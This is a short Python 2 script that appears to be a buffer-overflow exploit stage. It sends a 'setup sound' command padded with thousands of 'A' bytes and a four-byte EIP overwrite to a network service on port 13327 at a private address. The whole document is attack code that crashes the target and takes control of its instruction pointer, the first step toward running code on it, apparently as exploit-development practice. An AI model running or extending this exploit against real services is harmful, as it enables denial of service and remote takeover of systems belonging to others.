#!/usr/bin/python
import socket
host = "192.168.163.44"
filler = "\x41" * 4368
eip = "B" * 4
buffer = "C" * 7
crash = filler + eip + buffer
buffer = "\x11(setup sound " + crash + "\x90\x00#"
print(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"